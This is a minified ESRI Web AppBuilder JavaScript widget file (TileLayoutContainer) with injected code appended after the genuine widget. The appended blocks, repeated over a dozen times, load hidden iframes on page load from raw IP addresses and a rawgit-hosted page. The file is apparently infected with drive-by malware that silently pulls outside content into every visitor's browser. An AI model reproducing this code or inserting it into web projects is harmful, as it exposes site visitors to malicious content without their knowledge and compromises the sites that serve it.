// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/declare","dojo/_base/lang","dojo/_base/html","dijit/_WidgetBase"],function(g,f,d,h){return g([h],{baseClass:"jimu-tile-container",declaredClass:"jimu.dijit.TileLayoutContainer",constructor:function(){this.items=[];this.vmargin=this.hmargin=15},startup:function(){this.inherited(arguments);this.items.forEach(f.hitch(this,function(a){this._placeItem(a)}));this.resize()},_placeItem:function(a){a.domNode?d.place(a.domNode,this.domNode):d.place(a,this.domNode)},addItem:function(a){this.items.push(a);
this._placeItem(a);this.resize()},addItems:function(a){this.items=this.items.concat(a);this.items.forEach(f.hitch(this,function(a){this._placeItem(a)}));this.resize()},removeItem:function(a){var b;for(b=0;b<this.items.length;b++)if(this.items[b].label===a){this.items[b].domNode?this.items[b].destroy():d.destroy(this.items[b]);this.items.splice(b,1);this.resize();break}},empty:function(){var a;for(a=0;a<this.items.length;a++)this.items[a].domNode?this.items[a].destroy():d.destroy(this.items[a]);this.items=
[]},resize:function(){var a,b,c;a=d.getMarginBox(this.domNode);b=this.getItemSize(a);c=Math.floor((a.w+this.hmargin)/(b.width+this.hmargin));this.items.forEach(f.hitch(this,function(a,d){this.setItemPosition(a,d,b,c)}))},getItemSize:function(a){var b={},c;if("fixWidth"===this.strategy)b.width=this.itemSize.width,b.height=this.itemSize.height;else if("breakWidth"===this.strategy)for(c=0;c<this.itemSize.length;c++){if(a.w<=this.itemSize[c].screenWidth){b.width=this.itemSize[c].width;b.height=this.itemSize[c].height;
break}}else"fixCols"===this.strategy&&(b.width=(a.w-this.hmargin*(this.maxCols-1))/this.maxCols,b.height="number"===typeof this.itemSize.height?this.itemSize.height:b.width*parseFloat(this.itemSize.height.substring(0,this.itemSize.height.length-1))/100);return b},setItemPosition:function(a,b,c,e){b++;var f=b%e;b=Math.ceil(b/e);0===f&&(f=e);e={position:"absolute",top:(this.vmargin+c.height)*(b-1)+"px"};e[window.isRTL?"right":"left"]=(this.hmargin+c.width)*(f-1)+"px";0<=c.width&&(e.width=c.width+"px");
0<=c.height&&(e.height=c.height+"px");d.setStyle(a.domNode?a.domNode:a,e)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});